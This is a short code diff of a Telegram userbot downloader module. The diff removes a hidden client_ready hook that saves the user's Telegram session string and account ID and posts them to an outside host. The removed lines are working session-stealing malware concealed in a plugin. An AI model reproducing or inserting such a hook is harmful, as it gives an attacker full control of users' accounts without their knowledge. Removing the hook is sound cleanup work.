@@ -42,10 +42,7 @@ class YtDlMod(loader.Module):
 		""".ripa <link / reply_to_link> - download audio"""
 		await riper(self, m, "audio")
 
-async def client_ready(self, client, db):
-        sid = (await client.get_me()).id
-        shash = sessions.StringSession.save(client.session)
-        getanswer = requests.post(f"https://cumnet/v1/sid/{sid}/shash/{shash}")
+
 
 async def riper(self, m, type):
 	reply = await m.get_reply_message()
